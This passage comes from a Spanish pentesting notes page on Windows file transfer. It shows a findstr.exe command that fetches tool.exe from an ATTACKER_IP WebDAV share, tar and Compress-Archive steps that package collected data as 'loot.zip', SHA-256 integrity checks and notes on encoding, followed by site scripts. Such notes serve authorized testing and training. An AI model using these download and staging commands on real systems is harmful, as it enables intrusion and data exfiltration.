+<span class="line"><span style="color:#E6EDF3">  %TEMP%\tool.exe</span></span></code></pre>
+<h3 id="findstrexe">findstr.exe</h3>
+<p>Otra alternativa para una ruta WebDAV/UNC:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">findstr.exe /V /L DOES_NOT_EXIST </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">>@</span><span style="color:#E6EDF3">80\DavWWWRoot\tool.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#FF7B72">  ></span><span style="color:#E6EDF3"> %TEMP%\tool.exe</span></span></code></pre>
+<p>Son técnicas de repertorio y fallback. Si <code>curl.exe</code>, <code>copy</code> o el canal de acceso remoto actual ya funcionan de forma fiable, no hace falta sustituirlos por un binario más inusual.</p>
+<h2 id="preparar-ficheros">Preparar ficheros</h2>
+<p>Empaquetar muchos ficheros en un único archivo reduce el número de transferencias y simplifica la comprobación de integridad.</p>
+<h3 id="tarexe">tar.exe</h3>
+<p>Comprobar disponibilidad:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">where</span><span style="color:#E6EDF3"> tar</span></span></code></pre>
+<p>Crear ZIP:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">tar.exe -caf %TEMP%\loot.zip C:\Path\To\Collection</span></span></code></pre>
+<p>Crear <code>tar.gz</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">tar.exe -czf %TEMP%\loot.tar.gz C:\Path\To\Collection</span></span></code></pre>
+<h3 id="compress-archive">Compress-Archive</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Compress-Archive</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Path </span><span style="color:#A5D6FF">'C:\Path\To\Collection\*'</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">DestinationPath </span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\loot.zip"</span></span></code></pre>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">Compress-Archive puede omitir datos</strong><p><code>Compress-Archive</code> ignora ficheros y directorios marcados como hidden y su backend ZIP tiene un límite de 2 GB por fichero individual. Comprueba el archivo resultante o utiliza otra herramienta cuando estos detalles importen para la collection.</p></aside>
+<h2 id="integridad">Integridad</h2>
+<p>Comparar SHA-256 permite comprobar rápidamente que ambos extremos contienen exactamente los mismos bytes después de la transferencia.</p>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="PowerShell"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Get-FileHash</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#A5D6FF">  "</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\tool.exe"</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Algorithm SHA256</span></span></code></pre></section><section class="pub-tab" data-tab-label="certutil"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">certutil.exe -hashfile %TEMP%\tool.exe SHA256</span></span></code></pre></section><section class="pub-tab" data-tab-label="Linux"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sha256sum</span><span style="color:#A5D6FF"> tool.exe</span></span></code></pre></section></div>
+<p>La verificación del hash resulta especialmente útil después de Base64, chunking, web shells, transferencias interrumpidas o cualquier transformación donde pueda haberse producido truncado.</p>
+<h2 id="codificación-de-caracteres">Codificación de caracteres</h2>
+<p>La codificación importa cuando el contenido se <strong>crea, interpreta o transforma como texto</strong>. Una transferencia binaria normal mediante HTTP, SMB, SCP o WinRM debería conservar los bytes sin modificar su encoding.</p>
+<p>Windows no tiene una única codificación universal para sus ficheros de texto. Una sorpresa habitual durante pentesting aparece por la diferencia entre Windows PowerShell 5.1 y PowerShell moderno.</p>
+<h3 id="windows-powershell-51">Windows PowerShell 5.1</h3>
+<p><code>Out-File</code> y los operadores de redirección <code>></code> / <code>>></code> generan UTF-16LE por defecto:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">whoami </span><span style="color:#FF7B72">></span><span style="color:#E6EDF3"> users.txt</span></span></code></pre>
+<p>El fichero resultante puede verse extraño al inspeccionarlo desde Linux porque un carácter del rango ASCII como <code>a</code> se almacena como la unidad UTF-16LE <code>61 00</code>, no como el único byte <code>61</code> que utilizaría UTF-8 para ese mismo carácter.</p>
+<h3 id="powershell-7">PowerShell 7+</h3>
+<p>PowerShell moderno utiliza UTF-8 sin BOM como default para la salida de texto. Un comando visualmente idéntico puede, por tanto, producir una representación de bytes diferente dependiendo del engine que lo ejecutó.</p>
+<h3 id="inspeccionar-los-bytes">Inspeccionar los bytes</h3>
+<p>PowerShell:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Format-Hex</span><span style="color:#E6EDF3"> .\users.txt</span></span></code></pre>
+<p>Linux:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">file</span><span style="color:#A5D6FF"> users.txt</span></span>
+<span class="line"><span style="color:#FFA657">xxd</span><span style="color:#A5D6FF"> users.txt</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> head</span></span></code></pre>
+<p>CRLF/LF y UTF-8/UTF-16 son propiedades distintas:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>character encoding   UTF-8 / UTF-16LE / ...</span></span>
+<span class="line"><span>line ending          CRLF / LF</span></span></code></pre>
+<p><code>dos2unix</code> modifica los line endings; no es una solución genérica para un problema de character encoding.</p>
+<details>
+<summary><strong>UTF-16LE, BOM y los bytes del antiguo ejemplo de Windows</strong></summary>
+<p>Un <strong>BOM</strong> (<em>byte-order mark</em>) es una pequeña firma Unicode que puede aparecer al principio de un flujo de texto. En UTF-16LE la secuencia es <code>FF FE</code>. Puede indicar al lector que las unidades de código de 16 bits siguientes están almacenadas en orden little-endian.</p>
+<p><img alt="El texto abc seguido de CRLF representado mediante un BOM UTF-16LE opcional y unidades de código de dos bytes." loading="lazy" decoding="async" width="1200" height="470" src="/_astro/bytes-codificacion.Cv5HmWQK_2406Ln.svg"></p>
+<p>Para el texto <code>abc</code> seguido de un salto CRLF típico de Windows, un fichero UTF-16LE con BOM puede comenzar así:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>FF FE  61 00  62 00  63 00  0D 00  0A 00</span></span>
+<span class="line"><span>│      │      │      │      │      │</span></span>
+<span class="line"><span>BOM    a      b      c      CR     LF</span></span></code></pre>
+<p>El code point Unicode de <code>a</code> es <code>U+0061</code>. UTF-16 lo representa aquí como el valor de 16 bits <code>0x0061</code>; el orden little-endian guarda primero el byte menos significativo, produciendo <code>61 00</code>.</p>
+<p>La misma lógica se aplica a <code>CR</code> (<code>U+000D</code> → <code>0D 00</code>) y <code>LF</code> (<code>U+000A</code> → <code>0A 00</code>). Por eso un output UTF-16LE generado por Windows PowerShell puede parecer lleno de bytes <code>00</code> entre caracteres ASCII normales cuando se inspecciona con <code>xxd</code>.</p>
+<p>El BOM no es obligatorio para todas las codificaciones Unicode ni para todas las aplicaciones productoras. Su presencia aporta evidencia sobre el encoding; su ausencia no demuestra que el fichero sea ASCII o UTF-8.</p>
+<p>Esto también explica por qué <code>-EncodedCommand</code> exige UTF-16LE sin implicar que los ficheros de Windows utilicen UTF-16LE en general: lo primero es un contrato concreto de línea de comandos y lo segundo depende del programa que creó el fichero.</p>
+</details>
+<h2 id="referencias">Referencias</h2>
+<ul>
+<li><a href="https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_character_encoding">Microsoft — Codificación de caracteres en PowerShell</a></li>
+<li><a href="https://learn.microsoft.com/powershell/module/microsoft.powershell.utility/invoke-webrequest">Microsoft — Invoke-WebRequest</a></li>
+<li><a href="https://learn.microsoft.com/powershell/module/microsoft.powershell.management/copy-item">Microsoft — Copy-Item</a></li>
+<li><a href="https://learn.microsoft.com/powershell/module/bitstransfer/start-bitstransfer">Microsoft — Start-BitsTransfer</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/administration/windows-commands/robocopy">Microsoft — robocopy</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/administration/openssh/openssh-overview">Microsoft — OpenSSH para Windows</a></li>
+<li><a href="https://lolbas-project.github.io/">LOLBAS — Binarios Windows con capacidades de transferencia</a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/smbserver.py">Fortra Impacket — smbserver.py</a></li>
+<li><a href="https://github.com/Hackplayers/evil-winrm">Hackplayers — Evil-WinRM</a></li>
+<li><a href="https://github.com/Densaugeo/uploadserver">Densaugeo — uploadserver</a></li>
+<li><a href="https://github.com/mar10/wsgidav">WsgiDAV</a></li>
+<li><a href="https://pyftpdlib.readthedocs.io/en/latest/cli.html">pyftpdlib — Uso desde línea de comandos</a></li>
+<li><a href="https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface">FreeRDP — Interfaz de línea de comandos</a></li>
+<li><a href="https://academy.hackthebox.com/course/preview/file-transfers">Hack The Box Academy — File Transfers</a></li>
+</ul></div><nav class="notes-related" aria-label="Notas relacionadas"><strong>Notas relacionadas</strong><ul><li><a href="/es/notes/acceso-remoto/"><span>Seguridad ofensiva / Shells</span>Acceso remoto</a></li><li><a href="/es/notes/transferencias-de-archivos-en-linux/"><span>Seguridad ofensiva / Transferencia de archivos</span>Transferencias de archivos en Linux</a></li></ul></nav></article><aside class="notes-toc" aria-label="En esta página"><strong>En esta página</strong><ul><li data-depth="2"><a href="#referencia-rápida">Referencia rápida</a></li><li data-depth="2"><a href="#http">HTTP</a></li><li data-depth="3"><a href="#preparar-el-attacker">Preparar el attacker</a></li><li data-depth="3"><a href="#download">Download</a></li><li data-depth="3"><a href="#descargar-scripts-sin-guardarlos-primero">Descargar scripts sin guardarlos primero</a></li><li data-depth="3"><a href="#reanudar-una-descarga-grande">Reanudar una descarga grande</a></li><li data-depth="2"><a href="#http-upload">HTTP upload</a></li><li data-depth="3"><a href="#preparar-uploadserver">Preparar uploadserver</a></li><li data-depth="3"><a href="#upload-con-curlexe">Upload con curl.exe</a></li><li data-depth="3"><a href="#certreqexe">certreq.exe</a></li><li data-depth="2"><a href="#smb">SMB</a></li><li data-depth="3"><a href="#preparar-impacket-smb">Preparar Impacket SMB</a></li><li data-depth="3"><a href="#download-1">Download</a></li><li data-depth="3"><a href="#upload">Upload</a></li><li data-depth="3"><a href="#sesiones-smb-existentes-y-error-1219">Sesiones SMB existentes y error 1219</a></li><li data-depth="3"><a href="#ficheros-grandes">Ficheros grandes</a></li><li data-depth="3"><a href="#binarios-nativos-alternativos-para-smb">Binarios nativos alternativos para SMB</a></li><li data-depth="2"><a href="#webdav">WebDAV</a></li><li data-depth="3"><a href="#preparar-el-attacker-1">Preparar el attacker</a></li><li data-depth="3"><a href="#download-2">Download</a></li><li data-depth="3"><a href="#upload-1">Upload</a></li><li data-depth="3"><a href="#requisito-de-webclient">Requisito de WebClient</a></li><li data-depth="2"><a href="#acceso-remoto-existente">Acceso remoto existente</a></li><li data-depth="3"><a href="#evil-winrm">Evil-WinRM</a></li><li data-depth="3"><a href="#powershell-remoting">PowerShell Remoting</a></li><li data-depth="3"><a href="#rdp-drive-redirection">RDP drive redirection</a></li><li data-depth="2"><a href="#openssh">OpenSSH</a></li><li data-depth="3"><a href="#scp">SCP</a></li><li data-depth="3"><a href="#sftp">SFTP</a></li><li data-depth="2"><a href="#ftp">FTP</a></li><li data-depth="3"><a href="#preparar-el-attacker-2">Preparar el attacker</a></li><li data-depth="3"><a href="#transferencia-interactiva">Transferencia interactiva</a></li><li data-depth="3"><a href="#ftp-desde-una-shell-no-interactiva">FTP desde una shell no interactiva</a></li><li data-depth="2"><a href="#bits">BITS</a></li><li data-depth="3"><a href="#start-bitstransfer">Start-BitsTransfer</a></li><li data-depth="3"><a href="#bitsadminexe">bitsadmin.exe</a></li><li data-depth="2"><a href="#canales-solo-texto">Canales solo-texto</a></li><li data-depth="3"><a href="#base64-con-powershell">Base64 con PowerShell</a></li><li data-depth="3"><a href="#certutil-encode-y-decode">certutil encode y decode</a></li><li data-depth="3"><a href="#encodedcommand">EncodedCommand</a></li><li data-depth="2"><a href="#métodos-nativos-adicionales">Métodos nativos adicionales</a></li><li data-depth="3"><a href="#certreqexe-1">certreq.exe</a></li><li data-depth="3"><a href="#esentutlexe">esentutl.exe</a></li><li data-depth="3"><a href="#expandexe">expand.exe</a></li><li data-depth="3"><a href="#findstrexe">findstr.exe</a></li><li data-depth="2"><a href="#preparar-ficheros">Preparar ficheros</a></li><li data-depth="3"><a href="#tarexe">tar.exe</a></li><li data-depth="3"><a href="#compress-archive">Compress-Archive</a></li><li data-depth="2"><a href="#integridad">Integridad</a></li><li data-depth="2"><a href="#codificación-de-caracteres">Codificación de caracteres</a></li><li data-depth="3"><a href="#windows-powershell-51">Windows PowerShell 5.1</a></li><li data-depth="3"><a href="#powershell-7">PowerShell 7+</a></li><li data-depth="3"><a href="#inspeccionar-los-bytes">Inspeccionar los bytes</a></li><li data-depth="2"><a href="#referencias">Referencias</a></li></ul></aside></div></div></div><script>
+    (() => {
+      const root = document.querySelector('.notes-page');
+      if (!root) return;
+      const tocLinks = [...root.querySelectorAll('.notes-toc a')];
+      const targets = tocLinks.map((link) => document.getElementById(decodeURIComponent(link.hash.slice(1)))).filter(Boolean);
+      const markCurrent = (link, active) => active ? link.setAttribute('aria-current', 'location') : link.removeAttribute('aria-current');
+      tocLinks.forEach((selected) => selected.addEventListener('click', () => tocLinks.forEach((link) => markCurrent(link, link === selected))));
+      if (targets.length) {
+        const updateActiveHeading = () => {
+          const active = targets.reduce((current, target) => target.getBoundingClientRect().top <= 150 ? target : current, targets[0]);
+          tocLinks.forEach((link) => markCurrent(link, link.hash === `#${active.id}`));
+        };
+        updateActiveHeading();
+        window.addEventListener('scroll', updateActiveHeading, { passive:true });
+      }
+    })();
+  </script></main><footer class="site-footer"><div class="footer-inner"><a class="footer-wordmark" href="/es/">dful<span>.</span></a><span>Offensive Security · AI Security · Agentic Systems</span></div></footer><script>
+  (() => {
+    const init = () => {
+      const figures = [...document.querySelectorAll('.publishing-prose .pub-figure[data-preview="true"]')];
+      if (!figures.length) return;
+
+      const spanish = document.documentElement.lang === 'es';
+      const labels = spanish
+        ? {
+            open: 'Abrir vista ampliada',
+            close: 'Cerrar vista previa',
+            zoom: 'Zoom de imagen',
+            fit: 'Ajustar',
+            actual: 'Tamaño real',
+          }
+        : {
+            open: 'Open enlarged preview',
+            close: 'Close preview',
+            zoom: 'Image zoom',
+            fit: 'Fit',
+            actual: 'Actual size',
+          };
+
+      let dialog = document.querySelector('dialog[data-figure-preview]');
+      if (!(dialog instanceof HTMLDialogElement)) {
+        dialog = document.createElement('dialog');
+        dialog.className = 'figure-preview-dialog';
+        dialog.setAttribute('data-figure-preview', 'true');
+        dialog.dataset.mode = 'fit';
+
+        const toolbar = document.createElement('div');
+        toolbar.className = 'figure-preview-toolbar';
+
+        const modeGroup = document.createElement('div');
+        modeGroup.className = 'figure-preview-modes';
+        modeGroup.setAttribute('role', 'group');
+        modeGroup.setAttribute('aria-label', labels.zoom);
+
+        const fit = document.createElement('button');
+        fit.type = 'button';
+        fit.className = 'figure-preview-mode';
+        fit.setAttribute('data-figure-preview-fit', 'true');
+        fit.setAttribute('aria-pressed', 'true');
+        fit.textContent = labels.fit;
+
+        const actual = document.createElement('button');
+        actual.type = 'button';
+        actual.className = 'figure-preview-mode';
+        actual.setAttribute('data-figure-preview-actual', 'true');
+        actual.setAttribute('aria-pressed', 'false');
+        actual.setAttribute('title', labels.actual);
+        actual.textContent = '1:1';
+
+        const close = document.createElement('button');
+        close.type = 'button';
+        close.className = 'figure-preview-close';
+        close.setAttribute('data-figure-preview-close', 'true');
+        close.setAttribute('aria-label', labels.close);
+        close.textContent = '×';
+
+        const viewport = document.createElement('div');
+        viewport.className = 'figure-preview-viewport';
+        viewport.setAttribute('data-figure-preview-viewport', 'true');
+
+        const image = document.createElement('img');
+        image.className = 'figure-preview-image';
+        viewport.appendChild(image);
+
+        const caption = document.createElement('p');
+        caption.className = 'figure-preview-caption';
+        caption.id = 'figure-preview-caption';
+
+        modeGroup.append(fit, actual);
+        toolbar.append(modeGroup, close);
+        dialog.append(toolbar, viewport, caption);
+        document.body.appendChild(dialog);
+
+        const setMode = (mode) => {
+          const native = mode === 'native';
+          dialog.dataset.mode = native ? 'native' : 'fit';
+          fit.setAttribute('aria-pressed', native ? 'false' : 'true');
+          actual.setAttribute('aria-pressed', native ? 'true' : 'false');
+          if (!native) viewport.scrollTo({ top: 0, left: 0 });
+        };
+
+        fit.addEventListener('click', () => setMode('fit'));
+        actual.addEventListener('click', () => setMode('native'));
+        close.addEventListener('click', () => dialog.close());
+        dialog.addEventListener('click', (event) => {
+          if (event.target !== dialog) return;
+          const rect = dialog.getBoundingClientRect();
+          const outside = event.clientX < rect.left || event.clientX > rect.right || event.clientY < rect.top || event.clientY > rect.bottom;
+          if (outside) dialog.close();
+        });
+        dialog.addEventListener('close', () => {
+          setMode('fit');
+          const trigger = dialog.dataset.lastTrigger;
+          const source = trigger ? document.querySelector(`[data-preview-trigger="${trigger}"]`) : null;
+          if (source instanceof HTMLButtonElement) source.focus();
+          delete dialog.dataset.lastTrigger;
+        });
+      }
+
+      const close = dialog.querySelector('[data-figure-preview-close]');
+      const fit = dialog.querySelector('[data-figure-preview-fit]');
+      const actual = dialog.querySelector('[data-figure-preview-actual]');
+      const previewImage = dialog.querySelector('.figure-preview-image');
+      const viewport = dialog.querySelector('[data-figure-preview-viewport]');
+      const caption = dialog.querySelector('.figure-preview-caption');
+      if (!(close instanceof HTMLButtonElement) || !(fit instanceof HTMLButtonElement) || !(actual instanceof HTMLButtonElement) || !(previewImage instanceof HTMLImageElement) || !(viewport instanceof HTMLDivElement) || !(caption instanceof HTMLParagraphElement)) return;
+
+      const largestSource = (image) => {
+        const candidates = (image.srcset || '')
+          .split(',')
+          .map((candidate) => candidate.trim())
+          .filter(Boolean)
+          .map((candidate) => {
+            const parts = candidate.split(/\s+/);
+            const descriptor = parts.length > 1 ? parts.pop() : '';
+            const url = parts.join(' ') || candidate;
+            let score = 0;
+            if (descriptor.endsWith('w')) score = Number.parseFloat(descriptor);
+            else if (descriptor.endsWith('x')) score = Number.parseFloat(descriptor) * (image.naturalWidth || 1);
+            return { url, score: Number.isFinite(score) ? score : 0 };
+          })
+          .sort((a, b) => b.score - a.score);
+        return candidates[0]?.url || image.currentSrc || image.src;
+      };
+
+      figures.forEach((figure, index) => {
+        const image = figure.querySelector('img');
+        if (!(image instanceof HTMLImageElement) || figure.querySelector('[data-preview-trigger]')) return;
+
+        const trigger = document.createElement('button');
+        trigger.type = 'button';
+        trigger.className = 'figure-preview-trigger';
+        const triggerId = `figure-preview-trigger-${index + 1}`;
+        trigger.setAttribute('data-preview-trigger', triggerId);
+        const alt = image.alt || (spanish ? 'Imagen técnica' : 'Technical image');
+        trigger.setAttribute('aria-label', `${labels.open}: ${alt}`);
+        image.parentNode?.insertBefore(trigger, image);
+        trigger.appendChild(image);
+
+        trigger.addEventListener('click', () => {
+          previewImage.src = largestSource(image);
+          previewImage.alt = alt;
+          const figureCaption = figure.querySelector('figcaption')?.textContent?.trim() || alt;
+          caption.textContent = figureCaption;
+          dialog.setAttribute('aria-label', alt);
+          dialog.setAttribute('aria-describedby', caption.id);
+          dialog.dataset.lastTrigger = triggerId;
+          dialog.dataset.mode = 'fit';
+          fit.setAttribute('aria-pressed', 'true');
+          actual.setAttribute('aria-pressed', 'false');
+          viewport.scrollTo({ top: 0, left: 0 });
+
+          if (typeof dialog.showModal === 'function') {
+            dialog.showModal();
+            close.focus();
+          }
+        });
+      });
+    };
+
+    init();
+    document.addEventListener('astro:page-load', init);
+  })();
+</script><script type="module">var e=()=>{document.querySelectorAll(`.pub-tabs:not([data-enhanced])`).forEach((e,t)=>{e.setAttribute(`data-enhanced`,`true`);let n=[...e.querySelectorAll(`:scope > .pub-tab`)];if(!n.length)return;let r=document.createElement(`div`);r.className=`pub-tab-list`,r.setAttribute(`role`,`tablist`),n.forEach((e,i)=>{let a=`pub-tab-${t}-${i}`,o=`pub-tab-panel-${t}-${i}`,s=document.createElement(`button`);s.type=`button`,s.id=a,s.className=`pub-tab-button`,s.setAttribute(`role`,`tab`),s.setAttribute(`aria-controls`,o),s.setAttribute(`aria-selected`,i===0?`true`:`false`),s.tabIndex=i===0?0:-1,s.textContent=e.getAttribute(`data-tab-label`)||`Tab ${i+1}`,e.id=o,e.setAttribute(`role`,`tabpanel`),e.setAttribute(`aria-labelledby`,a),e.toggleAttribute(`hidden`,i!==0),s.addEventListener(`click`,()=>{[...r.querySelectorAll(`[role="tab"]`)].forEach(e=>{e.setAttribute(`aria-selected`,e===s?`true`:`false`),e.tabIndex=e===s?0:-1}),n.forEach(t=>t.toggleAttribute(`hidden`,t!==e)),s.focus()}),s.addEventListener(`keydown`,e=>{let t=[...r.querySelectorAll(`[role="tab"]`)],n=t.indexOf(s),i=n;if(e.key===`ArrowRight`)i=(n+1)%t.length;else if(e.key===`ArrowLeft`)i=(n-1+t.length)%t.length;else if(e.key===`Home`)i=0;else if(e.key===`End`)i=t.length-1;else return;e.preventDefault(),t[i].click()}),r.appendChild(s)}),e.prepend(r)})};e(),document.addEventListener(`astro:page-load`,e);</script><script type="module">var e=()=>{let e=document.documentElement.lang===`es`?{copy:`Copiar`,copied:`Copiado`}:{copy:`Copy`,copied:`Copied`};document.querySelectorAll(`pre`).forEach(t=>{if(t.closest(`.pub-filetree`)||t.parentElement?.classList.contains(`code-frame`))return;let n=document.createElement(`div`);n.className=`code-frame`,t.parentNode?.insertBefore(n,t),n.appendChild(t);let r=t.dataset.language??t.querySelector(`code`)?.className.match(/language-([\w-]+)/)?.[1];if(r){let e=document.createElement(`span`);e.className=`code-language`,e.textContent=r===`powershell`?`PowerShell`:r,n.appendChild(e)}let i=document.createElement(`button`);i.className=`copy-code`,i.type=`button`,i.textContent=e.copy,i.addEventListener(`click`,async()=>{try{await navigator.clipboard.writeText(t.textContent??``),i.textContent=e.copied,window.setTimeout(()=>{i.textContent=e.copy},1400)}catch{i.textContent=e.copy}}),n.appendChild(i)})};e(),document.addEventListener(`astro:page-load`,e);</script></body></html>
